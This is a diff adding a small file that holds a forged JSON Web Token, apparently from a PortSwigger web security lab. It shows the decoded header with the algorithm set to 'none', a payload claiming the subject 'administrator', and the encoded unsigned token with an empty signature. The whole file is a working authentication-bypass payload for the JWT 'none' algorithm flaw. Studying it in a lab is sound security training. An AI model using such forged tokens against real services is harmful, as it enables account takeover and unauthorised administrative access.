@@ -1,0 +1,12 @@
+{
+  "kid": "4bae983b-8083-428b-8fba-4b0660467979",
+  "alg": "none"
+}
+
+{
+  "iss": "portswigger",
+  "exp": 1793694951,
+  "sub": "administrator"
+}
+
+eyJraWQiOiI0YmFlOTgzYi04MDgzLTQyOGItOGZiYS00YjA2NjA0Njc5NzkiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MzY5NDk1MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
